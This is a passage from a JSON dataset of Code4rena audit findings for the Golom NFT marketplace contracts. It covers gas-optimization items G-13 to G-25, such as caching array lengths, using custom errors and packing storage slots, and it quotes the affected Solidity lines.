      "content": "The overheads outlined below are _PER LOOP_, excluding the first loop<br>\n* storage arrays incur a Gwarmaccess (100 gas)\n* memory arrays use `MLOAD` (3 gas)\n* calldata arrays use `CALLDATALOAD` (3 gas)\n\t\nCaching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L143\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n143: for (uint256 index = 0; index < epochs.length; index++) {\n\n157: for (uint256 index = 0; index < epochs.length; index++) {\n\n180: for (uint256 tindex = 0; tindex < tokenids.length; tindex++) {\n\n183: for (uint256 index = 0; index < epochs.length; index++) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L415\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n415: for (uint256 i = 0; i < proof.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L171\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n171: for (uint256 index = 0; index < delegated.length; index++) {\n\n189: for (uint256 index = 0; index < delegatednft.length; index++) {\n\n199: for (uint256 i; i < _array.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-25-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "8779",
      "title": "[G-24] Do not calculate constants",
      "impact": "GAS",
      "content": "Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L48\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n48: uint256 constant dailyEmission = 600000 * 10**18;\n\n57: uint256 constant secsInDay = 24 * 60 * 60;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L296\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n296: uint256 internal constant MAXTIME = 4 * 365 * 86400;\n297: int128 internal constant iMAXTIME = 4 * 365 * 86400;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-24-do-not-calculate-constants",
      "tags": [],
      "finders": []
    },
    {
      "id": "8778",
      "title": "[G-23] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\n*There are 12 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L36\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\n36: function mint(address _account, uint256 _amount) external onlyMinter {\n\n42: function mintAirdrop(address _airdrop) external onlyOwner {\n\n50: function mintGenesisReward(address _rewardDistributor) external onlyOwner {\n\n58: function setMinter(address _minter) external onlyOwner {\n\n65: function executeSetMinter() external onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L285\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n285: function changeTrader(address _trader) external onlyOwner {\n\n291: function executeChangeTrader() external onlyOwner {\n\n298: function addVoteEscrow(address _voteEscrow) external onlyOwner {\n\n308: function executeAddVoteEscrow() external onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L444\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n444: function setDistributor(address _distributor) external onlyOwner {\n\n454: function executeSetDistributor() external onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L260\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n260: function changeMinVotingPower(uint256 _newMinVotingPower) external onlyOwner {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-23-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "8777",
      "title": "[G-22] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.\n\n*There are 5 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L58\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n58:    mapping(address => mapping(uint256 => uint256)) public feesTrader; // fees accumulated by address of trader per epoch\n59:    mapping(address => mapping(uint256 => uint256)) public feesExchange; // fees accumulated by exchange of trader per epoch\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L332\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n331: /// @dev Mapping from owner address to count of his tokens.\n332: mapping(address => uint256) internal ownerToNFTokenCount;\n\n334: /// @dev Mapping from owner address to mapping of index to tokenIds\n335: mapping(address => mapping(uint256 => uint256)) internal ownerToNFTokenIdList;\n\n340: /// @dev Mapping from owner address to mapping of operator addresses.\n341: mapping(address => mapping(address => bool)) internal ownerToOperators;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-22-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "8776",
      "title": "[G-21] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save **\\~50 gas** each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also saves deployment gas.\n\n*There are 76 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L24\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\n24: require(msg.sender == minter, 'GolomToken: only reward distributor can enable');\n\n43: require(!isAirdropMinted, 'already minted');\n\n51: require(!isGenesisRewardMinted, 'already minted');\n\n69: require(minterEnableDate <= block.timestamp, 'GolomToken: wait for timelock');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L88\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n88: require(msg.sender == trader);\n\n144: require(epochs[index] < epoch);\n\n158: require(epochs[index] < epoch);\n\n173: require(address(ve) != address(0), ' VE not added yet');\n\n181: require(tokenowner == ve.ownerOf(tokenids[tindex]), 'Can only claim for a single Address together');\n\n184: require(epochs[index] < epoch, 'cant claim for future epochs');\n185: require(claimed[tokenids[tindex]][epochs[index]] == 0, 'cant claim if already claimed');\n\n220: require(address(ve) != address(0), ' VE not added yet');\n\n292: require(traderEnableDate <= block.timestamp, 'RewardDistributor: time not over yet');\n\n309: require(voteEscrowEnableDate <= block.timestamp, 'RewardDistributor: time not over yet');\n\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L177\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n177: require(signaturesigner == o.signer, 'invalid signature');\n\n211:  require(\n212:    o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt + (o.totalAmt * 50) / 10000,\n213:    'amt not matching'\n214:  );\n\n217: require(msg.value >= o.totalAmt * amount + p.paymentAmt, 'mgmtm');\n\n220: require(msg.sender == o.reservedAddress);\n\n222: require(o.orderType == 0, 'invalid orderType');\n\n226: require(status == 3, 'order not valid');\n227: require(amountRemaining >= amount, 'order already filled');\n\n235: require(amount == 1, 'only 1 erc721 at 1 time');\n\n285: require(\n286:   o.totalAmt * amount >\n287:    (o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt) * amount + p.paymentAmt\n\n291:  require(msg.sender == o.reservedAddress);\n\n293: require(o.orderType == 1);\n\n295:  require(status == 3);\n296:  require(amountRemaining >= amount);\n\n299: require(amount == 1, 'only 1 erc721 at 1 time');\n\n313: require(o.signer == msg.sender);\n\n342: require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt);\n\n345: require(msg.sender == o.reservedAddress);\n\n347: require(o.orderType == 2);\n\n349: require(status == 3);\n350: require(amountRemaining >= amount);\n\n359: require(amount == 1, 'only 1 erc721 at 1 time');\n\n455: require(distributorEnableDate <= block.timestamp, 'not allowed');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L72\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n72: require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n73: require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');\n\n99: require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');\n\n130: require(blockNumber < block.number, 'VEDelegation: not yet determined');\n\n186: require(blockNumber < block.number, 'VEDelegation: not yet determined');\n\n211: require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n\n239: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n245: require(_isApprovedOrOwner(_sender, _tokenId));\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L360\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n360: require(_entered_state == _not_entered);\n\n538: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n540: require(_isApprovedOrOwner(_sender, _tokenId));\n\n646: require(owner != address(0));\n\n648: require(_approved != owner);\n\n652: require(senderIsOwner || senderIsApprovedForAll);\n\n869: require(msg.sender == voter);\n\n874: require(msg.sender == voter);\n\n879: require(msg.sender == voter);\n\n884: require(msg.sender == voter);\n\n889: require(msg.sender == voter);\n\n894: require(attachments[_from] == 0 && !voted[_from], 'attached');\n895: require(_from != _to);\n896: require(_isApprovedOrOwner(msg.sender, _from));\n897: require(_isApprovedOrOwner(msg.sender, _to));\n\n927: require(_value > 0); // dev: need non-zero value\n928: require(_locked.amount > 0, 'No existing lock found');\n929: require(_locked.end > block.timestamp, 'Cannot add to expired lock. Withdraw');\n\n944: require(_value > 0); // dev: need non-zero value\n945: require(unlock_time > block.timestamp, 'Can only lock until time in the future');\n946: require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 4 years max');\n\n982: require(_locked.amount > 0, 'No existing lock found');\n983: require(_locked.end > block.timestamp, 'Cannot add to expired lock. Withdraw');\n\n996: require(_locked.end > block.timestamp, 'Lock expired');\n997: require(_locked.amount > 0, 'Nothing is locked');\n998: require(unlock_time > _locked.end, 'Can only increase lock duration');\n999: require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 4 years max');\n\n1008: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n1011: require(block.timestamp >= _locked.end, \"The lock didn't expire\");\n\n1082: require(idToOwner[_tokenId] != address(0), 'Query for nonexistent token');\n\n1227: require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');\n```\n\n### Mitigation\nCustom errors are defined using the `error` statement<br>\nReplace `require` statements with custom errors.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-21-use-custom-errors-rather-than-revertrequire-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8775",
      "title": "[G-20] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.<br>\nIt is only beneficial to use reduced-size arguments if you are dealing with storage values because the compiler will pack multiple elements into one storage slot, and thus, combine multiple reads or writes into a single operation. When dealing with function arguments or memory values, there is no inherent benefit because the compiler does not pack these values.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html<br>\n\nUse a larger size then downcast where needed.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L271\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n271: int128 amount; //@audit no storage slot saved\n\n297: int128 internal constant iMAXTIME = 4 * 365 * 86400;\n\n311: mapping(uint256 => int128) public slope_changes; // time -> signed slope change\n\n320: uint8 public constant decimals = 18;\n\n356:  uint8 internal constant _not_entered = 1;\n357:\tuint8 internal constant _entered = 2;\n358:  uint8 internal _entered_state = 1;\n\n697:  int128 old_dslope = 0;\n698:  int128 new_dslope = 0;\n\n749:  int128 d_slope = 0;\n\n1169: int128 d_slope = 0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-20-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "8774",
      "title": "[G-19] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` and `assert` statement",
      "impact": "GAS",
      "content": "`> 0` is less efficient than `!= 0` for unsigned integers.<br>\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` and `assert` statements with the optimizer enabled (6 gas).<br>\n*There are 3 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L927\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n927: require(_value > 0); // dev: need non-zero value\n\n944: require(_value > 0); // dev: need non-zero value\n\n981: assert(_value > 0); // dev: need non-zero value\n```\n### Mitigation\nReplace `> 0` with `!= 0`<br>\nOr update soldity compiler to >=0.8.13\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-19-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-and-assert-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "8773",
      "title": "[G-18] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27><br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past.\n\n*There are 5 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L20\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\n20:    bool public isAirdropMinted;\n21:    bool public isGenesisRewardMinted;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L314\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n314: mapping(uint256 => bool) public voted;\n\n341: mapping(address => mapping(address => bool)) internal ownerToOperators;\n\n344: mapping(bytes4 => bool) internal supportedInterfaces;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-18-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "8772",
      "title": "[G-17] Unchecked arithmetic",
      "impact": "GAS",
      "content": "The default “checked” behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.<br>\nIf it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an unchecked block will save gas.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L60\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\nminterEnableDate = block.timestamp + 1 days;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L106\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n106: if (block.timestamp > startTime + (epoch) * secsInDay) {\n\n112:  uint256 tokenToEmit = (dailyEmission * (rewardToken.totalSupply() - rewardToken.balanceOf(address(ve)))) /\n113:    rewardToken.totalSupply();\n114:  uint256 stakerReward = (tokenToEmit * rewardToken.balanceOf(address(ve))) / rewardToken.totalSupply();\n\n118: epoch = epoch + 1;\n\n143: for (uint256 index = 0; index < epochs.length; index++) {\n\n157: for (uint256 index = 0; index < epochs.length; index++) {\n\n180: for (uint256 tindex = 0; tindex < tokenids.length; tindex++) {\n\n183: for (uint256 index = 0; index < epochs.length; index++) {\n\n258: for (uint256 index = 0; index < epoch; index++) {\n\n273: for (uint256 index = 0; index < epoch; index++) {\n\n286: traderEnableDate = block.timestamp + 1 days;\n\n302: voteEscrowEnableDate = block.timestamp + 1 days;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L324\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n324: uint256 newNonce = ++nonces[msg.sender];\n\n415: for (uint256 i = 0; i < proof.length; i++) {\n\n449: distributorEnableDate = block.timestamp + 1 days;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L107\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n107: numCheckpoints[toTokenId] = nCheckpoints + 1;\n\n119: return nCheckpoints > 0 ? checkpoints[tokenId][nCheckpoints - 1].delegatedTokenIds : myArray;\n\n138:    if (checkpoints[nftId][nCheckpoints - 1].fromBlock <= blockNumber) {\n139:        return checkpoints[nftId][nCheckpoints - 1].delegatedTokenIds;\n\n148: uint256 upper = nCheckpoints - 1;\n\n150: uint256 center = upper - (upper - lower) / 2;\n\n157: upper = center - 1;\n\n171: for (uint256 index = 0; index < delegated.length; index++) {\n172: \t    votes = votes + this.balanceOfNFT(delegated[index]);\n\n189:    for (uint256 index = 0; index < delegatednft.length; index++) {\n190:        votes = votes + this.balanceOfAtNFT(delegatednft[index], blockNumber);\n\n199: for (uint256 i; i < _array.length; i++) {\n\n201: _array[i] = _array[_array.length - 1];\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L499\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n499: ownerToNFTokenCount[_to] += 1;\n\n512: ownerToNFTokenCount[_from] -= 1;\n\n745: for (uint256 i = 0; i < 255; ++i) {\n\n748: t_i += WEEK;\n\n768: _epoch += 1;\n\n994: uint256 unlock_time = ((block.timestamp + _lock_duration) / WEEK) * WEEK; // Locktime is rounded down to weeks\n\n999: require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 4 years max');\n\n1044: for (uint256 i = 0; i < 128; ++i) {\n\n1049: uint256 _mid = (_min + _max + 1) / 2;\n\n1053: _max = _mid - 1;\n\n1115: for (uint256 i = 0; i < 128; ++i) {\n\n1120: uint256 _mid = (_min + _max + 1) / 2;\n\n1124: _max = _mid - 1;\n\n1167: for (uint256 i = 0; i < 255; ++i) {\n\n1213:  Point memory point_next = point_history[target_epoch + 1];\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/TokenUriHelper.sol#L138\n```solidity\nFile:\tcontracts/vote-escrow/TokenUriHelper.sol\n138:            digits++;\n139:            temp /= 10;\n\n143:            digits -= 1;\n144:            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n145:            value /= 10;\n```\n\n### Mitigation\nPlace the arithmetic operations in an `unchecked` block\n```\n\tfor (uint i; i < length;) {\n\t\t...\n\t\tunchecked{ ++i; }\n\t}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-17-unchecked-arithmetic",
      "tags": [],
      "finders": []
    },
    {
      "id": "8771",
      "title": "[G-16] `internal` and `private` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 10 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L116\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n116: function _getCurrentDelegated(uint256 tokenId) internal view returns (uint256[] memory) \n{\n129: function _getPriorDelegated(uint256 nftId, uint256 blockNumber) internal view returns (uint256[] memory) {\n\n198: function removeElement(uint256[] storage _array, uint256 _element) internal {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L452\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n452: function _addTokenToOwnerList(address _to, uint256 _tokenId) internal {\n\n462: function _removeTokenFromOwnerList(address _from, uint256 _tokenId) internal {\n\n571: function _isContract(address account) internal view returns (bool) {\n\n677: function _mint(address _to, uint256 _tokenId) internal returns (bool) {\n\n1107: function _balanceOfAtNFT(uint256 _tokenId, uint256 _block) internal view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L123\n```solidity\nFile:\tcontracts/governance/GolomToken.sol\n123: function _hashOrder(Order calldata o) private pure returns (bytes32) {\n\n127: function _hashOrderinternal(Order calldata o, uint256[2] memory extra) private pure returns (bytes32) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-16-internal-and-private-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8770",
      "title": "[G-15] `x += y` costs more gas than `x = x + y` for state variables",
      "impact": "GAS",
      "content": "`x += y` costs more than `x = x + y`<br>\nsame as `x -= y`<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L499\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n499: ownerToNFTokenCount[_to] += 1;\n\n512: ownerToNFTokenCount[_from] -= 1;\n```\n\n### Mitigation\nReplace `x += y` and `x -= y` with `x = x + y` and `x = x - y`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-15-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "8769",
      "title": "[G-14] State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "These state variables can be packed together to use less storage slots:<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L297\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n297: int128 internal constant iMAXTIME = 4 * 365 * 86400;\n\n320: uint8 public constant decimals = 18;\n\n347: bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;\n350: bytes4 internal constant ERC721_INTERFACE_ID = 0x80ac58cd;\n353: bytes4 internal constant ERC721_METADATA_INTERFACE_ID = 0x5b5e139f;\n\n356: uint8 internal constant _not_entered = 1;\n357: uint8 internal constant _entered = 2;\n358: uint8 internal _entered_state = 1;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-14-state-variables-can-be-packed-into-fewer-storage-slots",
      "tags": [],
      "finders": []
    },
    {
      "id": "8768",
      "title": "[G-13] `struct Order`: can be more tighly packed",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (20000 gas) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings.<br>\n\nBefore:<br>\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L47\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n47:     struct Order {\n        address collection; // NFT contract address\n        uint256 tokenId; // order for which tokenId of the collection\n        address signer; // maker of order address\n        uint256 orderType; // 0 if selling nft for eth , 1 if offering weth for nft,2 if offering weth for collection with special criteria root\n        uint256 totalAmt; // price value of the trade // total amt maker is willing to give up per unit of amount\n        Payment exchange; // payment agreed by maker of the order to pay on succesful filling of trade this amt is subtracted from totalamt\n        Payment prePayment; // another payment , can be used for royalty, facilating trades\n        bool isERC721; // standard of the collection , if 721 then true , if 1155 then false\n        uint256 tokenAmt; // token amt useful if standard is 1155 if >1 means whole order can be filled tokenAmt times\n        uint256 refererrAmt; // amt to pay to the address that helps in filling your order\n        bytes32 root; // A merkle root derived from each valid tokenId — set to 0 to indicate a collection-level or tokenId-specific order.\n        address reservedAddress; // if not address(0) , only this address can fill the order\n        uint256 nonce; // nonce of order usefull for cancelling in bulk\n        uint256 deadline; // timestamp till order is valid epoch timestamp in secs\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n```\n| Methods ||||||\n|-|:-|:-:|-|:-|:-:|\n| Contract | Method | min | max | avg | #calls |\n| GolomTrader | fillAsk | 238167 |241974|241425| 7 |\n| GolomTrader | setDistributor| 46281 